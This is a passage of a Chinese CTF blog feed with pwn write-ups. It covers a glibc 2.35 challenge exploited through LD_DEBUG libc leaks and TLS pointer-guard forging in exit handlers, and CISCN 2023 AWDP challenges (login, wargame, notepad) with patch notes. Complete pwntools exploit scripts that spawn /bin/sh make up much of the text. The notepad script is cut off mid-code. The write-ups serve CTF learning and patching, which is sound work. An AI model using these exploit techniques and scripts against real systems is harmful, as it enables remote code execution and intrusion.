href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041501580.png" title="image-20230704150138479" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041501580.png" alt="image-20230704150138479"></a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io = process([<span class="string">&quot;./pwn&quot;</span>,<span class="string">&#x27;run&#x27;</span>])</span><br></pre></td></tr></table></figure><h2 id="envp"><a href="#envp" class="headerlink" title="envp"></a>envp</h2><p>envp是main函数的第三个参数 用来存储环境变量的指针 而有这样一个环境变量 LD_DEBUG&#x3D;all</p><p>其原本是用来查看链接库的情况 从而诊断报错 但是其在输出一系列信息的同时 会顺带输出libc地址</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041527228.png" title="image-20230704152739137" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041527228.png" alt="image-20230704152739137"></a></p><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>到此为之 题目的核心考点其实比较明了了  就是利用信号14的handler函数来重新启动程序  并且我们可以控制argv的参数 使其为dbg 我们就可以进入漏洞函数</p><p>为了实现这一点 我们需要触发abort 而本题开启了canary 并且在输入index或者是size时 存在了单字节的溢出 可以覆盖到canary的最后一个字节 那么当check触发时 调用__stack_chk_fail函数时 其内部会通过libc_message函数来输出报错信息 其中就会调用到abort函数</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041513529.png" title="image-20230704151349487" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041513529.png" alt="image-20230704151349487"></a></p><p>但是还有一个问题我们没有办法解决 虽然dgb函数中给了我们任意地址读和任意地址写的功能 但是开启了PIE保护的情况下 我们要如何获取libc地址来构造rop链呢</p><p>就是利用将程序的环境变量指针替换为指向LD_DEBUG&#x3D;all字符串的指针 从而泄露libc</p><p>你可以注意到 在我们输入username后的下一个输入点 存在2字节的溢出 而后面的内容正好是envp环境变量</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041529582.png" title="image-20230704152944558" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041529582.png" alt="image-20230704152944558"></a></p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041529061.png" title="image-20230704152909029" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041529061.png" alt="image-20230704152909029"></a></p><p>同时你可以发现sub_14b0函数 可以泄露出栈地址的后两个字节</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041532282.png" title="image-20230704153210244" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041532282.png" alt="image-20230704153210244"></a></p><p>而我们如果在一开始的username中输入LD_DEBUG&#x3D;all字符串 那么此时就可以在对应的偏移中看到指向该字符串的指针  </p><p>配合该偏移 我们可以在后续的溢出中将环境变量的指针替换成指向LD_DEBUG&#x3D;all字符串 从而在程序重新运行的时候输出libc基址</p><h2 id="exit调用链"><a href="#exit调用链" class="headerlink" title="exit调用链"></a>exit调用链</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">sub_1B70</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *s[<span class="number">9</span>]; <span class="comment">// [rsp+0h] [rbp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  s[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please don&#x27;t patch this normal function, we will check it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] Debug the note.&quot;</span>);</span><br><span class="line">  s[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;[Addr] &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">8uLL</span>);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;[Read] &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(s[<span class="number">0</span>]);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;[Addr] &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">8uLL</span>);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;[Write] &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s[<span class="number">0</span>], <span class="number">0x90</span>uLL);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到dbg函数虽然给了任意地址读和任意地址写 看起来好像我们可以往栈上写入rop链 随后劫持程序执行流 但是实际不会执行到leave和ret来结束栈帧 就会触发exit 所以我们这里只能通过布局tls结构体来控制exit函数</p><p>2.35以上的版本  exit函数内部调用了__run_exit_handlers函数 </p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041704491.png" title="image-20230704170431440" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041704491.png" alt="image-20230704170431440"></a></p><p>而该函数内部又调用了一个关键的函数 可以供我们实现任意函数调用</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041705601.png" title="image-20230704170511575" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041705601.png" alt="image-20230704170511575"></a></p><p>下面跟着我来分析一下如何构造tls结构体 以此来实现system函数调用</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041707838.png" title="image-20230704170734787" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041707838.png" alt="image-20230704170734787"></a></p><p>这里的rbx的值通常是不会变化的 其取决于rip索引 我们这里需要使得je跳转失败 从而才能进入任意函数调用的部分</p><p>这里的rbp取值是根据tls结构体低地址处 我们计算好偏移以后 利用dgb函数的任意写机会将其修改不为0后即可不跳转</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041710607.png" title="image-20230704171004573" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041710607.png" alt="image-20230704171004573"></a></p><p>这部分的内容是新版本加入的指针保护机制  通过循环右移11位后和tls结构体中的key异或后解密指针</p><p>当然我们拥有tls结构体任意写的权限话 很容易就能绕过 我们只需要使得rax一开始为0 设置fs:0x30处为system函数</p><p>异或过后rax的值就被设置成了system函数地址</p><p>而rdi寄存器的参数取决于rbp寄存器 rbp寄存器的值取决于我们一开始任意写的地址 fs_base-88处存放的值</p><p>计算好偏移 我们可以得到下面的payload 其可以实现call system 并且rdi参数为binsh</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(target+<span class="number">0x8</span>)+p64(<span class="number">0</span>)+p64(target+<span class="number">0x18</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x68</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x88</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(system_addr)</span><br></pre></td></tr></table></figure><p>但是你会发现system函数会卡在这里</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041714298.png" title="image-20230704171453250" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041714298.png" alt="image-20230704171453250"></a></p><p>这是因为我们破坏了tls结构体  我们把断点打在pthread_setcancelstate</p><p>看看rdx寄存器是怎么样赋值的</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041715302.png" title="image-20230704171544271" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041715302.png" alt="image-20230704171544271"></a></p><p>于是fs_base+0x10处的值不能被破坏 我们通过观察原本的tls结构会发现 其和fs_base+0x8处 是构成一个链表 由偏移0x10处指向偏移0x8处 而偏移0x8处指向自身</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041717023.png" title="image-20230704171742004" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041717023.png" alt="image-20230704171742004"></a></p><p>但是经过我实际测试 我们只需要保证fs:0x10处的地址+0x971后 是一个可读的内存地址即可 也就是说libc_addr-0x972也可以通过</p><p>那么最后的payload即为:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(target+<span class="number">0x8</span>)+p64(<span class="number">0</span>)+p64(target+<span class="number">0x18</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x68</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(libc_addr-<span class="number">0x972</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x88</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(system_addr)</span><br></pre></td></tr></table></figure><h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">io = process([<span class="string">&quot;./pwn&quot;</span>,<span class="string">&#x27;run&#x27;</span>])</span><br><span class="line"><span class="comment">#io = remote(&quot;175.20.26.10&quot;,9999)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/chen/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;UserName: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;LD_DEBUG=all&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;LD_DEBUG=all@Note $ &quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *$rebase(0x150D)&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.sendline(<span class="string">&quot;++--++--&quot;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Super note: &quot;</span>)</span><br><span class="line">number = <span class="built_in">int</span>(io.recv(<span class="number">5</span>),<span class="number">10</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(number))</span><br><span class="line">io.recvuntil(<span class="string">&quot;LD_DEBUG=all@Note $ &quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *$rebase(0x1730)&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">number += <span class="number">0x1c</span></span><br><span class="line">payload = cyclic(<span class="number">0x30</span>)+p16(number)</span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;LD_DEBUG=all@Note $ &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;Note_Add&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x19</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *$rebase(0x17ff)&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;base: &quot;</span>)</span><br><span class="line">libc_addr = <span class="built_in">int</span>(io.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">io.recvuntil(<span class="string">&quot;[Addr] &quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *$rebase(0x1BF1)&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">envp_addr = libc_addr + libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">io.send(p64(libc_addr))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">target = libc_addr - <span class="number">0x2898</span> - <span class="number">0x28</span> - <span class="number">0x58</span></span><br><span class="line">stack_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;stack_addr :&quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">io.recvuntil(<span class="string">&quot;[Addr] &quot;</span>)</span><br><span class="line">success(<span class="string">&quot;target_addr :&quot;</span>+<span class="built_in">hex</span>(target))</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *$rebase(0x1C32)&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.send(p64(target))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = p64(target+<span class="number">0x8</span>)+p64(<span class="number">0</span>)+p64(target+<span class="number">0x18</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x68</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(libc_addr-<span class="number">0x972</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x88</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(system_addr)</span><br><span class="line">io.recvuntil(<span class="string">&quot;[Write] &quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *$rebase(0x1C6A)&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2023Ciscn华东南分区赛</title>
      <link href="/2023/06/25/2023Ciscn%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9B/"/>
      <url>/2023/06/25/2023Ciscn%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>第一次打awdp赛制的比赛 对于fix和attack节奏的把控有了一些理解 还学到了一点fix的小技巧 当然attack的题目也学到了很多东西 来做一个总结</p><h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306251351339.png" title="image-20230625135143266" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306251351339.png" alt="image-20230625135143266"></a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">240</span>]; <span class="comment">// [rsp+10h] [rbp-F0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_4011FB(a1, a2, a3);</span><br><span class="line">  sub_40127B();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to CISCN 2023!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter your password:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x90</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Login failed...&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Try again!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter your password:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;unk_404060, <span class="number">0x90</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以溢出0x10字节 同时可以往bss段写入数据 说实话 这种考点是我玩剩下的 出过很多这种类型的题目 这题很快就拿下了</p><p>由于read函数的rsi是通过rbp寄存器来索引的 我们只需要覆盖rbp为bss段地址 随后控制retaddr为read函数的参数赋值起始地址 就可以达成任意写 随后就是往bss段上写rop链泄露libc地址 然后利用pop rbp继续控制rbp的地址 然后再次跳转实现任意写 最后构造system</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;175.20.26.11&quot;</span>,<span class="number">9999</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Enter your password:&quot;</span>)</span><br><span class="line">bss_addr = elf.bss(<span class="number">0x800</span>)</span><br><span class="line">ptr_addr = <span class="number">0x401316</span></span><br><span class="line">rdi_addr = <span class="number">0x00000000004013d3</span></span><br><span class="line">leave_addr = <span class="number">0x000000000040136e</span></span><br><span class="line">ret_addr = <span class="number">0x000000000040101a</span></span><br><span class="line">rbp_addr = <span class="number">0x00000000004011bd</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = cyclic(<span class="number">0xf0</span>)+p64(bss_addr+<span class="number">0xf0</span>)+p64(ptr_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Enter your password:&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;aaaa&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x40136F&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">payload = p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(rbp_addr)+p64(elf.bss(<span class="number">0xbf8</span>))+p64(ptr_addr)+p64(rbp_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0xf0</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(bss_addr-<span class="number">0x8</span>)+p64(leave_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">payload = <span class="string">b&#x27;aaaa&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">libc_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">payload = p64(ret_addr)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0xf0</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(elf.bss(<span class="number">0xb00</span>))+p64(leave_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;aaaa&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x40136F&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>​           </p><h2 id="wargame"><a href="#wargame" class="headerlink" title="wargame"></a>wargame</h2><p>这题的代码量很大 需要慢慢审计 最后是在adjust weapon中 发现了一个函数可以往堆地址写入数据 并且是用for循环来的   </p><p>将for循环的次数修改为0次后就通过了check</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> __fastcall <span class="title function_">sub_2E18</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> result; <span class="comment">// al</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( dword_81E4 )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Error.&quot;</span>);</span><br><span class="line">  result = <span class="built_in">printf</span>(<span class="string">&quot;Info: &quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = sub_15FF(a1 + <span class="number">16</span> + <span class="number">32</span> * i + <span class="number">16LL</span>, <span class="number">16LL</span>) == <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  dword_81E4 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="notepad"><a href="#notepad" class="headerlink" title="notepad"></a>notepad</h2><p>2.35的一道堆 存在UAF漏洞 </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_16B0</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> *v1; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;page: &quot;</span>);</span><br><span class="line">  result = choice();</span><br><span class="line">  <span class="keyword">if</span> ( result &lt;= <span class="number">0xE</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = &amp;unk_4040 + <span class="number">16</span> * result;</span><br><span class="line">    <span class="keyword">if</span> ( *v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(*v1);</span><br><span class="line">      *(v1 + <span class="number">2</span>) = <span class="number">0</span>;</span><br><span class="line">      result = <span class="built_in">puts</span>(<span class="string">&quot;Success~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>置零的是存放size的指针 将其修改为v1 置零堆块指针即可成功fix</p><p>attack的话 这题除了UAF之外 edit函数中还存在一个漏洞 </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_1790</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> *v1; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;page: &quot;</span>);</span><br><span class="line">  v0 = choice();</span><br><span class="line">  <span class="keyword">if</span> ( v0 &gt; <span class="number">0xE</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;The notepad don&#x27;t have this page!&quot;</span>);</span><br><span class="line">  v1 = &amp;unk_4040 + <span class="number">16</span> * v0;</span><br><span class="line">  <span class="keyword">if</span> ( !*v1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;The notepad don&#x27;t have this page!&quot;</span>);</span><br><span class="line">  **v1 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !*(v1 + <span class="number">2</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;The notepad don&#x27;t have this page!&quot;</span>);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;date: &quot;</span>);</span><br><span class="line">  sub_13E0(*v1);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;content: &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> sub_13E0((*v1 + <span class="number">16LL</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在检查size指针之前 就对chunk的前0x10字节清空了 这意味着我们可以在释放chunk到tcachebin后 借此来清空key域 以此来实现double free</p><p>随后就是2.35的io链利用</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;175.20.26.10&quot;,9999)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,data,payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;date: &quot;</span>)</span><br><span class="line">    io.sendline(data)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;page: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;page: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;page: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">b&#x27;aaaa&#x27;</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">delete(<span 